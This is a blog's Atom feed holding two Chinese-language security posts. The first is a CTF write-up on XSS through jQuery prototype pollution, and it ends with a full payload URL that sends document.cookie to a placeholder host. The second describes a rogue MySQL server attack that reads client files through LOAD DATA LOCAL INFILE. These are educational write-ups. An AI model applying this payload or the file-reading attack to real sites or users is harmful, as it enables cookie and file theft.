<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lcark</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lcark.github.io/"/>
  <updated>2019-10-27T04:07:53.084Z</updated>
  <id>https://lcark.github.io/</id>
  
  <author>
    <name>Lcark</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hack.lu ctf-Car Repair Shop(xss, prototype pollution, bypass) </title>
    <link href="https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/"/>
    <id>https://lcark.github.io/2019/10/26/hack-lu-ctf-Car-Repair-Shop/</id>
    <published>2019-10-26T15:57:00.000Z</published>
    <updated>2019-10-27T04:07:53.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>“Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.” <a href="https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">传送门</a></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>点开题目，右下角有个明显的链接<code>get your cookie</code>, 是一个提交链接的界面</p><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>显然是dom-based xss<br><br>以下是关键代码<br><br>car.class.js</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line"> ……</span><br><span class="line">    repair() &#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">            $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ignition() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">""</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`Looks like the key got lost. No wonder the car is not starting ...`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.key == <span class="string">"🔑"</span>) &#123;</span><br><span class="line">            infobox(<span class="string">`The car started!`</span>)</span><br><span class="line">            <span class="keyword">this</span>.start()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>util.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Bugatti'</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Porsche'</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要通过<code>autoStart</code>修复<code>bugatti</code>和<code>porsche</code>这两辆车来执行<br><code>repairWithHelper</code>函数以此来触发xss，我们需要解决以下问题</p><ol><li>绕过 key == “🔑”来启动 <code>bugatti</code></li><li>绕过 $.md5(porsche) == ‘9cdfb439c7876e703e307864c9167a15’来执行<code>repairWithHelper</code>函数</li><li>绕过<code>repairWithHelper</code>函数中的正则表达式来执行js<br></li></ol><p>要解决第一个问题，我们发现了如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">repair() &#123;</span><br><span class="line">    <span class="keyword">if</span>(urlParams.has(<span class="string">'repair'</span>)) &#123;</span><br><span class="line">        $.extend(<span class="literal">true</span>, <span class="keyword">this</span>, <span class="built_in">JSON</span>.parse(urlParams.get(<span class="string">'repair'</span>)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是<code>jQuery</code>官方对<code>extend</code>函数的定义：<br><img src="/images/pasted-1.png" alt="upload successful"><br>这样我们就可以在<code>url</code>中添加<code>repair</code>参数来解决第一个问题:<br><code>https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair={&quot;key&quot;:&quot;🔑&quot;,&quot;}#BugattiPorsche</code></p><p>第二个问题似乎就没有这么简单，我们要使<code>porsch</code>的md5为<code>9cdfb439c7876e703e307864c9167a15</code>,实际上就是<code>lol</code>的md5值，我们不妨直接计算<code>porsche</code>的md5</p><p><img src="/images/pasted-2.png" alt="upload successful"><br>发现其md5为<code>[object Object]</code>的md5，这是为什么呢？<br>实际上调用md5函数之前会调用<code>toString</code>方法，而<code>porsche</code>又继承于<code>Object</code>类，我们不妨改写此方法<br><img src="/images/pasted-3.png" alt="upload successful"><br>和我们料想的一模一样，因此可以改写<code>porsche</code>的<code>toString</code>方法来绕过，然而<code>JSON.parse</code>并不支持方法的解析，那怎么办呢？<br>我们就不得不了解一下js中的<code>prototype</code>，什么是原型呢？<br>引用《JavaScript权威指南》的一段描述：</p><blockquote><p>Every JavaScript object has a second JavaScript object (or null ,but this is rare) associated with it. This second object is known as a prototype, and the first object inherits properties from the prototype.</p></blockquote><p>意思就是基本上每个js对象都有一个第二对象，这个对象就是原型，第一对象的所有属性都继承于原型。</p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>当调用一个对象的属性或方法时，它首先会从当前对象所定义的属性和对象寻找，若是没有，则从所继承的对象寻找即从<code>__proto__</code>寻找，若还是没有，则继续从<code>__proto__.proto__</code>寻找，直至最后。简而言之，<code>__proto__</code>所代表的就是所继承对象的原型，我们可以通过修改这个<code>__proto__</code>来达到修改父类属性或方法的目的，甚至直接修改它的父类。</p><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>那么第二个问题就迎刃而解，我们将<code>porsche</code>的父类的父类改为<code>[&#39;lol&#39;]</code>，这样就会调用<code>toString</code>返回<code>lol</code>来绕过<code>md5</code>检测。</p><p><img src="/images/pasted-6.png" alt="upload successful"></p><p><code>payload: repair={&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p><p>第三个问题我们需要绕过<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;</span><br></pre></td></tr></table></figure><p>这个正则表达式，这个我们用<code>data</code>协议绕过即可：<br><br><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></p><p><img src="/images/pasted-7.png" alt="upload successful"></p><p>OK！以下是完整payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?repair=&#123;&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:[&quot;lol&quot;]&#125;&#125;&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/,$.get(&apos;[your-url]&apos;+document.cookie)//.js#Bugatti%20Porsche</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li>使用extend绕过key的检测</li><li>替换<code>porsche</code>的父类来绕过md5</li><li>使用data协议绕过src的正则表达式</li></ol><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ol><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;“Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.” &lt;a href=&quot;https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;点开题目，右下角有个明显的链接&lt;code&gt;get your cookie&lt;/code&gt;, 是一个提交链接的界面&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-0.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;&lt;p&gt;显然是dom-based xss&lt;br&gt;&lt;br&gt;以下是关键代码&lt;br&gt;&lt;br&gt;car.class.js&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="ctf" scheme="https://lcark.github.io/tags/ctf/"/>
    
      <category term="xss" scheme="https://lcark.github.io/tags/xss/"/>
    
      <category term="prototype pollution" scheme="https://lcark.github.io/tags/prototype-pollution/"/>
    
  </entry>
  
  <entry>
    <title>MysqlClientAttack</title>
    <link href="https://lcark.github.io/2019/09/24/tags/"/>
    <id>https://lcark.github.io/2019/09/24/tags/</id>
    <published>2019-09-24T13:06:00.000Z</published>
    <updated>2019-10-12T09:02:46.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h2><p>在mysql中可以通过<code>load data local infile &quot;/var/lib/mysql-files/test.txt&quot; into table test</code>命令，将本地文件上传至MySQL服务器，实际上，服务器可以直接发出请求来读取客户端文件，而不需要经过用户同意。</p><a id="more"></a><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>客户端发出命令请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223700-eef63dc0-dfa1-1.png" alt="image.png"><br>服务端发出读取文件请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223739-064eca3c-dfa2-1.png" alt="image.png"><br>客户端发送文件<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925223903-381ed7fa-dfa2-1.png" alt="image.png"><br>若是服务端直接发出读取文件请求，客户端便会直接发送本地文件。</p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><hr><p>客户端连接服务器<br>服务器发送Greeting包，要求客户端提供密码<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224231-b40f5178-dfa2-1.png" alt="image.png"><br>客户端发送登陆请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224419-f4effe22-dfa2-1.png" alt="image.png"><br>服务端直接发出ok，然后服务端直接发出读取文件请求<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224712-5ba065da-dfa3-1.png" alt="image.png"><br>客户端便会直接发送本地文件。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925224744-6ee9ec1a-dfa3-1.png" alt="image.png"></p><h1 id="攻击总览"><a href="#攻击总览" class="headerlink" title="攻击总览"></a>攻击总览</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225550-908cd930-dfa4-1.png" alt="image.png"><br>注意中间的query request是每次登陆成功的版本号查询，我们并未响应<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225737-d06485e4-dfa4-1.png" alt="image.png"></p><h1 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h1><hr><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190925225915-0aaf8730-dfa5-1.png" alt="image.png"><br>详见 <a href="https://github.com/lcark/MysqlClientAttack/" target="_blank" rel="noopener">https://github.com/lcark/MysqlClientAttack/</a></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><hr><p>运行脚本，监听本地端口<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162007-1ca83a22-e35b-1.png" alt="image.png"><br>客户端连接<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162037-2eb0676c-e35b-1.png" alt="image.png"><br>一有连接，即可读取到客户端文件</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162117-463b20de-e35b-1.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;#漏洞分析&quot;&gt;&lt;/a&gt;#漏洞分析&lt;/h2&gt;&lt;p&gt;在mysql中可以通过&lt;code&gt;load data local infile &amp;quot;/var/lib/mysql-files/test.txt&amp;quot; into table test&lt;/code&gt;命令，将本地文件上传至MySQL服务器，实际上，服务器可以直接发出请求来读取客户端文件，而不需要经过用户同意。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="mysql" scheme="https://lcark.github.io/tags/mysql/"/>
    
      <category term="web" scheme="https://lcark.github.io/tags/web/"/>
    
      <category term="client" scheme="https://lcark.github.io/tags/client/"/>
    
  </entry>
  
</feed>
